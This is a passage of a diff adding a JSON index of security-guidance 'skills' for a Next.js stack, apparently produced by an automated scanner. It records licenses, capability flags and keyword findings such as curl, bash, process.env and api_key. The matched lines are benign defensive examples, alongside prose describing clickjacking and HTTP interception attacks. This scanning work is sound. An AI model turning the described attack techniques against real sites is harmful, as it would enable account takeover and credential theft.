+            "context": "const clerkDomain = process.env.NEXT_PUBLIC_CLERK_FRONTEND_API_URL"
+          },
+          {
+            "type": "credential-access",
+            "line": 85,
+            "evidence": "process.env",
+            "context": "  ? new URL(process.env.NEXT_PUBLIC_CLERK_FRONTEND_API_URL).origin"
+          },
+          {
+            "type": "filesystem-write",
+            "line": 104,
+            "evidence": "Delete",
+            "context": "Attacker embeds your \"Delete Account\" button in an invisible iframe overlay on a game site. Users think they're clicking \"Play Game\" but actually click \"Delete Account.\""
+          },
+          {
+            "type": "filesystem-write",
+            "line": 104,
+            "evidence": "Delete",
+            "context": "Attacker embeds your \"Delete Account\" button in an invisible iframe overlay on a game site. Users think they're clicking \"Play Game\" but actually click \"Delete Account.\""
+          },
+          {
+            "type": "network-access",
+            "line": 146,
+            "evidence": "https://",
+            "context": "User types \"yourapp.com\" (no https://). Browser initially requests HTTP. Attacker intercepts, serves fake HTTP version, steals credentials."
+          },
+          {
+            "type": "credential-access",
+            "line": 150,
+            "evidence": "process.env",
+            "context": "if (process.env.NODE_ENV === 'production') {"
+          },
+          {
+            "type": "filesystem-write",
+            "line": 166,
+            "evidence": "remove",
+            "context": "**Important:** Once HSTS is set for a domain, browsers remember it. If you need to remove it, you must:"
+          },
+          {
+            "type": "credential-access",
+            "line": 203,
+            "evidence": "process.env",
+            "context": "  const clerkDomain = process.env.NEXT_PUBLIC_CLERK_FRONTEND_API_URL"
+          },
+          {
+            "type": "credential-access",
+            "line": 204,
+            "evidence": "process.env",
+            "context": "    ? new URL(process.env.NEXT_PUBLIC_CLERK_FRONTEND_API_URL).origin"
+          },
+          {
+            "type": "credential-access",
+            "line": 207,
+            "evidence": "process.env",
+            "context": "  const convexDomain = process.env.NEXT_PUBLIC_CONVEX_URL"
+          },
+          {
+            "type": "credential-access",
+            "line": 208,
+            "evidence": "process.env",
+            "context": "    ? new URL(process.env.NEXT_PUBLIC_CONVEX_URL).origin"
+          },
+          {
+            "type": "network-access",
+            "line": 214,
+            "evidence": "https://",
+            "context": "    `script-src 'self' 'unsafe-inline' 'unsafe-eval' ${clerkDomain} https://js.stripe.com`,"
+          },
+          {
+            "type": "network-access",
+            "line": 216,
+            "evidence": "https://",
+            "context": "    `connect-src 'self' ${clerkDomain} ${convexDomain} https://api.stripe.com`,"
+          },
+          {
+            "type": "network-access",
+            "line": 217,
+            "evidence": "https://",
+            "context": "    `frame-src 'self' ${clerkDomain} https://js.stripe.com https://hooks.stripe.com`,"
+          },
+          {
+            "type": "network-access",
+            "line": 217,
+            "evidence": "https://",
+            "context": "    `frame-src 'self' ${clerkDomain} https://js.stripe.com https://hooks.stripe.com`,"
+          },
+          {
+            "type": "credential-access",
+            "line": 232,
+            "evidence": "process.env",
+            "context": "  if (process.env.NODE_ENV === 'production') {"
+          },
+          {
+            "type": "shell-execution",
+            "line": 256,
+            "evidence": "bash",
+            "context": "```bash"
+          },
+          {
+            "type": "network-access",
+            "line": 257,
+            "evidence": "curl",
+            "context": "curl -I http://localhost:3000"
+          },
+          {
+            "type": "network-access",
+            "line": 257,
+            "evidence": "http://",
+            "context": "curl -I http://localhost:3000"
+          },
+          {
+            "type": "shell-execution",
+            "line": 267,
+            "evidence": "bash",
+            "context": "```bash"
+          },
+          {
+            "type": "network-access",
+            "line": 269,
+            "evidence": "curl",
+            "context": "curl -I https://yourapp.com"
+          },
+          {
+            "type": "network-access",
+            "line": 269,
+            "evidence": "https://",
+            "context": "curl -I https://yourapp.com"
+          },
+          {
+            "type": "shell-execution",
+            "line": 277,
+            "evidence": "bash",
+            "context": "```bash"
+          },
+          {
+            "type": "network-access",
+            "line": 278,
+            "evidence": "curl",
+            "context": "curl -I http://localhost:3000/dashboard"
+          },
+          {
+            "type": "network-access",
+            "line": 278,
+            "evidence": "http://",
+            "context": "curl -I http://localhost:3000/dashboard"
+          },
+          {
+            "type": "network-access",
+            "line": 287,
+            "evidence": "https://",
+            "context": "- **Security Headers:** https://securityheaders.com/"
+          },
+          {
+            "type": "network-access",
+            "line": 288,
+            "evidence": "https://",
+            "context": "- **Mozilla Observatory:** https://observatory.mozilla.org/"
+          },
+          {
+            "type": "network-access",
+            "line": 289,
+            "evidence": "https://",
+            "context": "- **SSL Labs:** https://www.ssllabs.com/ssltest/"
+          },
+          {
+            "type": "network-access",
+            "line": 303,
+            "evidence": "https://",
+            "context": "  `script-src 'self' 'unsafe-inline' 'unsafe-eval' ${clerkDomain} https://js.stripe.com https://www.googletagmanager.com https://www.google-analytics.com`,"
+          },
+          {
+            "type": "network-access",
+            "line": 303,
+            "evidence": "https://",
+            "context": "  `script-src 'self' 'unsafe-inline' 'unsafe-eval' ${clerkDomain} https://js.stripe.com https://www.googletagmanager.com https://www.google-analytics.com`,"
+          },
+          {
+            "type": "network-access",
+            "line": 303,
+            "evidence": "https://",
+            "context": "  `script-src 'self' 'unsafe-inline' 'unsafe-eval' ${clerkDomain} https://js.stripe.com https://www.googletagmanager.com https://www.google-analytics.com`,"
+          },
+          {
+            "type": "network-access",
+            "line": 305,
+            "evidence": "https://",
+            "context": "  `connect-src 'self' ${clerkDomain} ${convexDomain} https://api.stripe.com https://www.google-analytics.com https://analytics.google.com`,"
+          },
+          {
+            "type": "network-access",
+            "line": 305,
+            "evidence": "https://",
+            "context": "  `connect-src 'self' ${clerkDomain} ${convexDomain} https://api.stripe.com https://www.google-analytics.com https://analytics.google.com`,"
+          },
+          {
+            "type": "network-access",
+            "line": 305,
+            "evidence": "https://",
+            "context": "  `connect-src 'self' ${clerkDomain} ${convexDomain} https://api.stripe.com https://www.google-analytics.com https://analytics.google.com`,"
+          },
+          {
+            "type": "credential-access",
+            "line": 313,
+            "evidence": "process.env",
+            "context": "const cdnDomain = process.env.NEXT_PUBLIC_CDN_URL"
+          },
+          {
+            "type": "credential-access",
+            "line": 314,
+            "evidence": "process.env",
+            "context": "  ? new URL(process.env.NEXT_PUBLIC_CDN_URL).origin"
+          },
+          {
+            "type": "encoded-content",
+            "line": 336,
+            "evidence": "base64",
+            "context": "const nonce = crypto.randomBytes(16).toString('base64');"
+          },
+          {
+            "type": "network-access",
+            "line": 348,
+            "evidence": "https://",
+            "context": "`img-src 'self' data: https://gravatar.com https://images.yourapp.com`"
+          },
+          {
+            "type": "network-access",
+            "line": 348,
+            "evidence": "https://",
+            "context": "`img-src 'self' data: https://gravatar.com https://images.yourapp.com`"
+          },
+          {
+            "type": "network-access",
+            "line": 386,
+            "evidence": "https://",
+            "context": "- Mozilla Security Headers Guide: https://infosec.mozilla.org/guidelines/web_security"
+          },
+          {
+            "type": "network-access",
+            "line": 387,
+            "evidence": "https://",
+            "context": "- OWASP Secure Headers Project: https://owasp.org/www-project-secure-headers/"
+          },
+          {
+            "type": "network-access",
+            "line": 388,
+            "evidence": "https://",
+            "context": "- Content Security Policy: https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP"
+          },
+          {
+            "type": "network-access",
+            "line": 389,
+            "evidence": "https://",
+            "context": "- HSTS Specification: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Strict-Transport-Security"
+          },
+          {
+            "type": "network-access",
+            "line": 390,
+            "evidence": "https://",
+            "context": "- Security Headers Checker: https://securityheaders.com/"
+          }
+        ]
+      },
+      "capabilities": {
+        "shell": false,
+        "network": true,
+        "credentials": true,
+        "dynamic_execution": false,
+        "package_install": false
+      }
+    },
+    {
+      "path": "security-operations/SKILL.md",
+      "name": "security-operations-deployment",
+      "description": "Operational security guidance for deployment, monitoring, and maintenance. Use this skill when you need to understand which middlewares to apply, configure environment variables, monitor security post-deployment, or follow the pre-deployment checklist. Triggers include \"security operations\", \"deployment security\", \"security monitoring\", \"environment variables\", \"when to use middleware\", \"pre-deployment\", \"security checklist\", \"production security\".",
+      "skill_sha256": "a90a68cd7161373f13d77a223070ec2d4bde3765ec53836898b9d7a66ab2162c",
+      "license": {
+        "spdx": "MIT",
+        "redistributable": true,
+        "status": "verified",
+        "evidence_path": "LICENSE"
+      },
+      "security": {
+        "scan_status": "review-required",
+        "risk": "medium",
+        "capabilities": {
+          "shell": true,
+          "network": true,
+          "credentials": true,
+          "dynamic_execution": false,
+          "package_install": false,
+          "filesystem_write": true,
+          "encoded_content": false
+        },
+        "findings": [
+          {
+            "type": "filesystem-write",
+            "line": 34,
+            "evidence": "DELETE",
+            "context": "- All POST/PUT/DELETE operations"
+          },
+          {
+            "type": "shell-execution",
+            "line": 78,
+            "evidence": "bash",
+            "context": "```bash"
+          },
+          {
+            "type": "network-access",
+            "line": 87,
+            "evidence": "https://",
+            "context": "NEXT_PUBLIC_CLERK_FRONTEND_API_URL=https://your-app.clerk.accounts.dev"
+          },
+          {
+            "type": "network-access",
+            "line": 91,
+            "evidence": "https://",
+            "context": "NEXT_PUBLIC_CONVEX_URL=https://...convex.cloud"
+          },
+          {
+            "type": "credential-access",
+            "line": 97,
+            "evidence": "Secret",
+            "context": "# Optional: Clerk Webhook Secret"
+          },
+          {
+            "type": "shell-execution",
+            "line": 103,
+            "evidence": "bash",
+            "context": "```bash"
+          },
+          {
+            "type": "network-access",
+            "line": 111,
+            "evidence": "https://",
+            "context": "NEXT_PUBLIC_CLERK_FRONTEND_API_URL=https://your-app.clerk.accounts.com"
+          },
+          {
+            "type": "network-access",
+            "line": 115,
+            "evidence": "https://",
+            "context": "NEXT_PUBLIC_CONVEX_URL=https://...convex.cloud"
+          },
+          {
+            "type": "credential-access",
+            "line": 121,
+            "evidence": "Secret",
+            "context": "# Optional: Clerk Webhook Secret (production)"
+          },
+          {
+            "type": "shell-execution",
+            "line": 127,
+            "evidence": "bash",
+            "context": "```bash"
+          },
+          {
+            "type": "credential-access",
+            "line": 141,
+            "evidence": "secret",
+            "context": "- Store production secrets in hosting platform's secret manager"
+          },
+          {
+            "type": "credential-access",
+            "line": 166,
+            "evidence": "process.env",
+            "context": "  const missing = requiredEnvVars.filter(v => !process.env[v]);"
+          },
+          {
+            "type": "credential-access",
+            "line": 172,
+            "evidence": "secret",
+            "context": "  // Validate secret lengths"
+          },
+          {
+            "type": "credential-access",
+            "line": 173,
+            "evidence": "process.env",
+            "context": "  if (process.env.CSRF_SECRET && process.env.CSRF_SECRET.length < 32) {"
+          },
+          {
+            "type": "credential-access",
+            "line": 173,
+            "evidence": "process.env",
+            "context": "  if (process.env.CSRF_SECRET && process.env.CSRF_SECRET.length < 32) {"
+          },
+          {
+            "type": "credential-access",
+            "line": 177,
+            "evidence": "process.env",
+            "context": "  if (process.env.SESSION_SECRET && process.env.SESSION_SECRET.length < 32) {"
+          },
+          {
+            "type": "credential-access",
+            "line": 177,
+            "evidence": "process.env",
+            "context": "  if (process.env.SESSION_SECRET && process.env.SESSION_SECRET.length < 32) {"
+          },
+          {
+            "type": "network-access",
+            "line": 216,
+            "evidence": "curl",
+            "context": "- [ ] Security headers verified (`curl -I https://yourapp.com`)"
+          },
+          {
+            "type": "network-access",
+            "line": 216,
+            "evidence": "https://",
+            "context": "- [ ] Security headers verified (`curl -I https://yourapp.com`)"
+          },
+          {
+            "type": "filesystem-write",
+            "line": 231,
+            "evidence": "DELETE",
+            "context": "- [ ] All POST/PUT/DELETE routes have CSRF protection"
+          },
+          {
+            "type": "network-access",
+            "line": 251,
+            "evidence": "curl",
+            "context": "- [ ] Security headers checked: `curl -I https://yourapp.com`"
+          },
+          {
+            "type": "network-access",
+            "line": 251,
+            "evidence": "https://",
+            "context": "- [ ] Security headers checked: `curl -I https://yourapp.com`"
+          },
+          {
+            "type": "shell-execution",
+            "line": 257,
+            "evidence": "bash",
+            "context": "```bash"
+          },
+          {
+            "type": "credential-access",
+            "line": 261,
+            "evidence": "api_key",
+            "context": "grep -r \"api_key.*=\" . --exclude-dir=node_modules"
+          },
+          {
+            "type": "shell-execution",
+            "line": 268,
+            "evidence": "bash",
+            "context": "bash scripts/security-check.sh"
+          },
+          {
+            "type": "shell-execution",
+            "line": 268,
+            "evidence": "sh",
+            "context": "bash scripts/security-check.sh"
+          },
+          {
+            "type": "credential-access",
+            "line": 289,
+            "evidence": "credential",
+            "context": "- 429s on login endpoints → credential stuffing attempt"
+          },
+          {
+            "type": "shell-execution",
+            "line": 349,
+            "evidence": "bash",
+            "context": "```bash"
+          },
+          {
+            "type": "network-access",
+            "line": 351,
+            "evidence": "https://",
+            "context": "https://vercel.com/your-project/logs"
+          },
+          {
+            "type": "credential-access",
+            "line": 380,
+            "evidence": "process.env",
+            "context": "    environment: process.env.NODE_ENV,"
+          },
+          {
+            "type": "credential-access",
+            "line": 385,
+            "evidence": "process.env",
+            "context": "  if (process.env.NODE_ENV === 'production') {"
+          },
+          {
+            "type": "shell-execution",
+            "line": 467,
+            "evidence": "sh",
+            "context": "- `scripts/security-check.sh` - Dependency audit"
+          },
+          {
+            "type": "shell-execution",
+            "line": 468,
+            "evidence": "sh",
+            "context": "- `scripts/security-test.sh` - Comprehensive security test suite (if created)"
+          },
+          {
+            "type": "network-access",
+            "line": 478,
+            "evidence": "https://",
+            "context": "- OWASP Top 10 2021: https://owasp.org/www-project-top-ten/"
+          },
+          {
+            "type": "network-access",
+            "line": 479,
+            "evidence": "https://",
+            "context": "- OWASP Cheat Sheet Series: https://cheatsheetseries.owasp.org"
+          },
+          {
+            "type": "network-access",
+            "line": 480,
+            "evidence": "https://",
+            "context": "- OWASP API Security Top 10: https://owasp.org/www-project-api-security/"
+          },
+          {
+            "type": "network-access",
+            "line": 483,
+            "evidence": "https://",
+            "context": "- Next.js Security: https://nextjs.org/docs/app/guides/security"
+          },
+          {
+            "type": "network-access",
+            "line": 484,
+            "evidence": "https://",
+            "context": "- Clerk Security: https://clerk.com/docs/security"
+          },
+          {
+            "type": "network-access",
+            "line": 485,
+            "evidence": "https://",
+            "context": "- Convex Security: https://docs.convex.dev/production/hosting/authentication"
+          },
+          {
+            "type": "network-access",
+            "line": 486,
+            "evidence": "https://",
+            "context": "- Stripe Security: https://stripe.com/docs/security"
+          },
+          {
+            "type": "network-access",
+            "line": 489,
+            "evidence": "https://",
+            "context": "- Security Headers Scanner: https://securityheaders.com/"
+          },
+          {
+            "type": "network-access",
+            "line": 490,
+            "evidence": "https://",
+            "context": "- Mozilla Observatory: https://observatory.mozilla.org/"
+          },
+          {
+            "type": "network-access",
+            "line": 491,
+            "evidence": "https://",
+            "context": "- SSL Labs Test: https://www.ssllabs.com/ssltest/"
+          },
+          {
+            "type": "shell-execution",
+            "line": 509,
+            "evidence": "bash",
+            "context": "- Full security audit: `bash scripts/security-check.sh`"
+          },
+          {
+            "type": "shell-execution",
+            "line": 509,
+            "evidence": "sh",
+            "context": "- Full security audit: `bash scripts/security-check.sh`"
+          },
+          {
+            "type": "network-access",
+            "line": 513,
+            "evidence": "https://",
+            "context": "- Check security headers: https://securityheaders.com/"
+          },
+          {
+            "type": "shell-execution",
+            "line": 526,
+            "evidence": "bash",
+            "context": "```bash"
+          },
+          {
+            "type": "shell-execution",
+            "line": 538,
+            "evidence": "bash",
+            "context": "bash scripts/security-check.sh"
+          },
+          {
+            "type": "shell-execution",
+            "line": 538,
+            "evidence": "sh",
+            "context": "bash scripts/security-check.sh"
+          },
+          {
+            "type": "network-access",
+            "line": 545,
+            "evidence": "curl",
+            "context": "curl -I https://yourapp.com"
+          },
+          {
+            "type": "network-access",
+            "line": 545,
+            "evidence": "https://",
+            "context": "curl -I https://yourapp.com"
+          }
+        ]
+      },
+      "capabilities": {
+        "shell": true,
+        "network": true,
+        "credentials": true,
+        "dynamic_execution": false,
+        "package_install": false
+      }
+    },
+    {
+      "path": "security-overview/SKILL.md",
+      "name": "security-architecture-overview",
+      "description": "Understand the defense-in-depth security architecture of Secure Vibe Coding OS. Use this skill when you need to understand the overall security approach, the 5-layer security stack, OWASP scoring, or when to use other security skills. Triggers include \"security architecture\", \"defense in depth\", \"security layers\", \"how does security work\", \"OWASP score\", \"security overview\", \"security principles\".",
+      "skill_sha256": "2a6388c1097cc6e15e8ce485346c61cc901de58acdb481fa650ec90fd4473fe1",
+      "license": {
+        "spdx": "MIT",
+        "redistributable": true,
+        "status": "verified",
+        "evidence_path": "LICENSE"
+      },
+      "security": {
+        "scan_status": "review-required",
+        "risk": "medium",
+        "capabilities": {
+          "shell": false,
+          "network": true,
+          "credentials": true,
+          "dynamic_execution": false,
+          "package_install": false,
+          "filesystem_write": true,
+          "encoded_content": false
+        },
+        "findings": [
+          {
+            "type": "filesystem-write",
+            "line": 108,
+            "evidence": "DELETE",
+            "context": "- **csrf-protection skill**: When creating POST/PUT/DELETE endpoints that change state"
+          },
+          {
+            "type": "credential-access",
+            "line": 201,
+            "evidence": "process.env",
+            "context": "The code detects `process.env.NODE_ENV === 'production'` and adjusts security posture automatically."
+          },
+          {
+            "type": "filesystem-write",
+            "line": 232,
+            "evidence": "DELETE",
+            "context": "- [ ] Applied `withCsrf()` for POST/PUT/DELETE"
+          },
+          {
+            "type": "credential-access",
+            "line": 384,
+            "evidence": "secret",
+            "context": "// BAD - Hardcoded secret"
+          },
+          {
+            "type": "credential-access",
+            "line": 385,
+            "evidence": "apiKey",
+            "context": "const apiKey = 'sk_live_123456789';"
+          },
+          {
+            "type": "credential-access",
+            "line": 388,
+            "evidence": "apiKey",
+            "context": "const apiKey = process.env.API_KEY;"
+          },
+          {
+            "type": "credential-access",
+            "line": 388,
+            "evidence": "process.env",
+            "context": "const apiKey = process.env.API_KEY;"
+          },
+          {
+            "type": "credential-access",
+            "line": 388,
+            "evidence": "API_KEY",
+            "context": "const apiKey = process.env.API_KEY;"
+          },
+          {
+            "type": "network-access",
+            "line": 505,
+            "evidence": "https://",
+            "context": "- OWASP Top 10 2021: https://owasp.org/www-project-top-ten/"
+          },
+          {
+            "type": "network-access",
+            "line": 506,
+            "evidence": "https://",
+            "context": "- OWASP Cheat Sheet Series: https://cheatsheetseries.owasp.org"
+          },
+          {
+            "type": "network-access",
+            "line": 507,
+            "evidence": "https://",
+            "context": "- Next.js Security: https://nextjs.org/docs/app/guides/security"
+          },
+          {
+            "type": "network-access",
+            "line": 508,
+            "evidence": "https://",
+            "context": "- Clerk Security: https://clerk.com/docs/security"
+          },
+          {
+            "type": "network-access",
+            "line": 509,
+            "evidence": "https://",
+            "context": "- OWASP Defense in Depth: https://owasp.org/www-community/Defense_in_Depth"
+          }
+        ]
+      },
+      "capabilities": {
+        "shell": false,
+        "network": true,
+        "credentials": true,
+        "dynamic_execution": false,
+        "package_install": false
+      }
+    },
+    {
+      "path": "security-prompts/SKILL.md",
+      "name": "security-prompts",
+      "description": "Library of battle-tested security prompt templates for secure feature implementation. Use when implementing forms, endpoints, authentication, authorization, file uploads, or conducting security reviews. Triggers include \"security prompt\", \"secure form\", \"RBAC\", \"threat model\", \"STRIDE\", \"admin endpoint\", \"file upload\", \"security testing\", \"code review\", \"OWASP\".",
+      "skill_sha256": "12dd80b8893d0be7571a1bbb85ac74f9c7f8c3ac6af79068c5510c7d36e29a05",
+      "license": {
+        "spdx": "MIT",
+        "redistributable": true,
+        "status": "verified",
+        "evidence_path": "LICENSE"
+      },
+      "security": {
+        "scan_status": "verified",
+        "risk": "none",
+        "capabilities": {
+          "shell": false,
+          "network": false,
+          "credentials": false,
+          "dynamic_execution": false,
+          "package_install": false,
+          "filesystem_write": false,
+          "encoded_content": false
+        },
+        "findings": []
+      },
+      "capabilities": {
+        "shell": false,
+        "network": false,
+        "credentials": false,
+        "dynamic_execution": false,
+        "package_install": false
+      }
+    },
+    {
+      "path": "security-prompts/auth-authorization/SKILL.md",
+      "name": "security-prompts-auth",
+      "description": "Authentication and authorization prompt templates for RBAC implementation, permissions systems, ownership verification, and authorization testing. Use when setting up roles, implementing access control, or testing authorization logic. Triggers include \"RBAC\", \"role-based access\", \"permissions\", \"ownership\", \"authorization\", \"access control\", \"user roles\", \"auth testing\".",
+      "skill_sha256": "47d0b4ad34238226b59266a349f9b23889fd6ccaf13fe94875f699fae7f32ad0",
+      "license": {
+        "spdx": "MIT",
+        "redistributable": true,
+        "status": "verified",
+        "evidence_path": "LICENSE"
+      },
+      "security": {
+        "scan_status": "review-required",
+        "risk": "low",
+        "capabilities": {
+          "shell": false,
+          "network": false,
+          "credentials": false,
+          "dynamic_execution": false,
+          "package_install": false,
+          "filesystem_write": true,
+          "encoded_content": false
+        },
+        "findings": [
+          {
+            "type": "filesystem-write",
+            "line": 54,
+            "evidence": "delete",
+            "context": "- `users.read`, `users.write`, `users.delete`"
+          },
+          {
+            "type": "filesystem-write",
+            "line": 197,
+            "evidence": "delete",
+            "context": "- admin: All user access + create/edit/delete posts, moderate comments"
+          },
+          {
+            "type": "filesystem-write",
+            "line": 258,
+            "evidence": "delete",
+            "context": "- Admin: Most permissions, cannot delete workspace"
+          },
+          {
+            "type": "filesystem-write",
+            "line": 343,
+            "evidence": "DELETE",
+            "context": "export async function DELETE(req: Request) {"
+          },
+          {
+            "type": "filesystem-write",
+            "line": 350,
+            "evidence": "Delete",
+            "context": "  // Delete logic"
+          },
+          {
+            "type": "filesystem-write",
+            "line": 382,
+            "evidence": "delete",
+            "context": "test(\"non-admin cannot delete posts\", async () => {"
+          },
+          {
+            "type": "filesystem-write",
+            "line": 383,
+            "evidence": "DELETE",
+            "context": "  const response = await DELETE(\"/api/posts/123\", {"
+          },
+          {
+            "type": "filesystem-write",
+            "line": 453,
+            "evidence": "DELETE",
+            "context": "export async function DELETE(req: Request) {"
+          }
+        ]
+      },
+      "capabilities": {
+        "shell": false,
+        "network": false,
+        "credentials": false,
+        "dynamic_execution": false,
+        "package_install": false
+      }
+    },
+    {
+      "path": "security-prompts/built-in-controls/SKILL.md",
+      "name": "security-prompts-controls",
+      "description": "Simple security prompt templates for quick implementations using existing Secure Vibe Coding OS utilities. Use for straightforward features like contact forms, authenticated updates, and public APIs. Triggers include \"contact form\", \"simple form\", \"authenticated update\", \"user update\", \"public API\", \"read-only API\", \"quick secure implementation\".",
+      "skill_sha256": "b395f0bbdfe0596814a46d12f53f3530f96862289d0f456eb9c6826df5455071",
+      "license": {
+        "spdx": "MIT",
+        "redistributable": true,
+        "status": "verified",
+        "evidence_path": "LICENSE"
+      },
+      "security": {
+        "scan_status": "verified",
+        "risk": "none",
+        "capabilities": {
+          "shell": false,
+          "network": false,
+          "credentials": false,
+          "dynamic_execution": false,
+          "package_install": false,
+          "filesystem_write": false,
+          "encoded_content": false
+        },
+        "findings": []
+      },
+      "capabilities": {
+        "shell": false,
+        "network": false,
+        "credentials": false,
+        "dynamic_execution": false,
+        "package_install": false
+      }
+    },
+    {
+      "path": "security-prompts/prompt-engineering/SKILL.md",
+      "name": "security-prompts-engineering",
+      "description": "Comprehensive security prompt templates for implementing secure features with multiple security layers. Use for complex implementations like forms, authenticated endpoints, public APIs, admin features, file uploads, middleware composition, and security testing. Triggers include \"secure form\", \"authenticated endpoint\", \"public endpoint\", \"admin action\", \"file upload\", \"composable middleware\", \"security testing\", \"new security control\".",
+      "skill_sha256": "b18f408d1f5fdebc482a59ba9cccf6c85457d911bda076591be962ba2cb7361a",
+      "license": {
+        "spdx": "MIT",
+        "redistributable": true,
+        "status": "verified",
+        "evidence_path": "LICENSE"
+      },
+      "security": {
+        "scan_status": "verified",
+        "risk": "none",
+        "capabilities": {
+          "shell": false,
+          "network": false,
+          "credentials": false,
+          "dynamic_execution": false,
+          "package_install": false,
+          "filesystem_write": false,
+          "encoded_content": false
+        },
+        "findings": []
+      },
+      "capabilities": {
+        "shell": false,
+        "network": false,
+        "credentials": false,
+        "dynamic_execution": false,
+        "package_install": false
+      }
+    },
+    {
+      "path": "security-prompts/threat-modeling/SKILL.md",
+      "name": "security-prompts-threat-modeling",
+      "description": "Security analysis and threat modeling prompt templates for STRIDE analysis, code review, OWASP compliance, and vulnerability assessment. Use for security planning, pre-deployment reviews, and ongoing threat assessment. Triggers include \"STRIDE\", \"threat model\", \"security review\", \"code review\", \"OWASP\", \"payment security\", \"security analysis\", \"vulnerability assessment\".",
+      "skill_sha256": "1affbca2989abc173ea403746df43733c573510d06405fec7bad7b5d191f65db",
+      "license": {
+        "spdx": "MIT",
+        "redistributable": true,
+        "status": "verified",
+        "evidence_path": "LICENSE"
+      },
+      "security": {
+        "scan_status": "verified",
+        "risk": "none",
+        "capabilities": {
+          "shell": false,
+          "network": false,
+          "credentials": false,
+          "dynamic_execution": false,
+          "package_install": false,
+          "filesystem_write": false,
+          "encoded_content": false
+        },
+        "findings": []
+      },
+      "capabilities": {
+        "shell": false,
+        "network": false,
+        "credentials": false,
+        "dynamic_execution": false,
+        "package_install": false
+      }
+    },
+    {
+      "path": "security-testing/SKILL.md",
+      "name": "security-testing-verification",
+      "description": "Test security features and verify implementation before deployment. Use this skill when you need to test CSRF protection, rate limiting, input validation, verify security headers, run security audits, or check the pre-deployment security checklist. Triggers include \"test security\", \"security testing\", \"verify security\", \"security checklist\", \"pre-deployment\", \"test CSRF\", \"test rate limit\", \"security verification\".",
+      "skill_sha256": "da1833a7d80ac2c1c8be7d9a46b56850e103d867afc0ce981502f16533fbf877",
+      "license": {
+        "spdx": "MIT",
+        "redistributable": true,
+        "status": "verified",
+        "evidence_path": "LICENSE"
+      },
+      "security": {
+        "scan_status": "review-required",
+        "risk": "low",
+        "capabilities": {
+          "shell": true,
+          "network": true,
+          "credentials": false,
+          "dynamic_execution": false,
+          "package_install": false,
+          "filesystem_write": true,
+          "encoded_content": false
+        },
+        "findings": [
+          {
+            "type": "shell-execution",
+            "line": 16,
+            "evidence": "bash",
+            "context": "```bash"
+          },
+          {
+            "type": "shell-execution",
+            "line": 46,
+            "evidence": "bash",
+            "context": "```bash"
+          },
+          {
+            "type": "network-access",
+            "line": 50,
+            "evidence": "curl",
+            "context": "  curl -s -o /dev/null -w \"%{http_code}\\n\" \\"
+          },
+          {
+            "type": "network-access",
+            "line": 51,
+            "evidence": "http://",
+            "context": "    http://localhost:3000/api/test-rate-limit"
+          },
+          {
+            "type": "shell-execution",
+            "line": 62,
+            "evidence": "bash",
+            "context": "```bash"
+          },
+          {
+            "type": "network-access",
+            "line": 65,
+            "evidence": "curl",
+            "context": "  curl http://localhost:3000/api/test-rate-limit"
+          },
+          {
+            "type": "network-access",
+            "line": 65,
+            "evidence": "http://",
+            "context": "  curl http://localhost:3000/api/test-rate-limit"
+          },
+          {
+            "type": "network-access",
+            "line": 72,
+            "evidence": "curl",
+            "context": "curl http://localhost:3000/api/test-rate-limit"
+          },
+          {
+            "type": "network-access",
+            "line": 72,
+            "evidence": "http://",
+            "context": "curl http://localhost:3000/api/test-rate-limit"
+          },
+          {
+            "type": "shell-execution",
+            "line": 81,
+            "evidence": "bash",
+            "context": "```bash"
+          },
+          {
+            "type": "network-access",
+            "line": 82,
+            "evidence": "curl",
+            "context": "curl -X POST http://localhost:3000/api/example-protected \\"
+          },
+          {
+            "type": "network-access",
+            "line": 82,
+            "evidence": "http://",
+            "context": "curl -X POST http://localhost:3000/api/example-protected \\"
+          },
+          {
+            "type": "shell-execution",
+            "line": 94,
+            "evidence": "bash",
+            "context": "```bash"
+          },
+          {
+            "type": "network-access",
+            "line": 96,
+            "evidence": "curl",
+            "context": "TOKEN=$(curl -s http://localhost:3000/api/csrf \\"
+          },
+          {
+            "type": "network-access",
+            "line": 96,
+            "evidence": "http://",
+            "context": "TOKEN=$(curl -s http://localhost:3000/api/csrf \\"
+          },
+          {
+            "type": "network-access",
+            "line": 100,
+            "evidence": "curl",
+            "context": "curl -X POST http://localhost:3000/api/example-protected \\"
+          },
+          {
+            "type": "network-access",
+            "line": 100,
+            "evidence": "http://",
+            "context": "curl -X POST http://localhost:3000/api/example-protected \\"
+          },
+          {
+            "type": "shell-execution",
+            "line": 111,
+            "evidence": "bash",
+            "context": "```bash"
+          },
+          {
+            "type": "network-access",
+            "line": 113,
+            "evidence": "curl",
+            "context": "TOKEN=$(curl -s http://localhost:3000/api/csrf \\"
+          },
+          {
+            "type": "network-access",
+            "line": 113,
+            "evidence": "http://",
+            "context": "TOKEN=$(curl -s http://localhost:3000/api/csrf \\"
+          },
+          {
+            "type": "network-access",
+            "line": 117,
+            "evidence": "curl",
+            "context": "curl -X POST http://localhost:3000/api/example-protected \\"
+          },
+          {
+            "type": "network-access",
+            "line": 117,
+            "evidence": "http://",
+            "context": "curl -X POST http://localhost:3000/api/example-protected \\"
+          },
+          {
+            "type": "network-access",
+            "line": 123,
+            "evidence": "curl",
+            "context": "curl -X POST http://localhost:3000/api/example-protected \\"
+          },
+          {
+            "type": "network-access",
+            "line": 123,
+            "evidence": "http://",
+            "context": "curl -X POST http://localhost:3000/api/example-protected \\"
+          },
+          {
+            "type": "shell-execution",
+            "line": 133,
+            "evidence": "bash",
+            "context": "```bash"
+          },
+          {
+            "type": "network-access",
+            "line": 134,
+            "evidence": "curl",
+            "context": "curl -X POST http://localhost:3000/api/example-protected \\"
+          },
+          {
+            "type": "network-access",
+            "line": 134,
+            "evidence": "http://",
+            "context": "curl -X POST http://localhost:3000/api/example-protected \\"
+          },
+          {
+            "type": "shell-execution",
+            "line": 149,
+            "evidence": "bash",
+            "context": "```bash"
+          },
+          {
+            "type": "network-access",
+            "line": 151,
+            "evidence": "curl",
+            "context": "curl -X POST http://localhost:3000/api/example-protected \\"
+          },
+          {
+            "type": "network-access",
+            "line": 151,
+            "evidence": "http://",
+            "context": "curl -X POST http://localhost:3000/api/example-protected \\"
+          },
+          {
+            "type": "shell-execution",
+            "line": 163,
+            "evidence": "bash",
+            "context": "```bash"
+          },
+          {
+            "type": "network-access",
+            "line": 165,
+            "evidence": "curl",
+            "context": "curl -X POST http://localhost:3000/api/example-protected \\"
+          },
+          {
+            "type": "network-access",
+            "line": 165,
+            "evidence": "http://",
+            "context": "curl -X POST http://localhost:3000/api/example-protected \\"
+          },
+          {
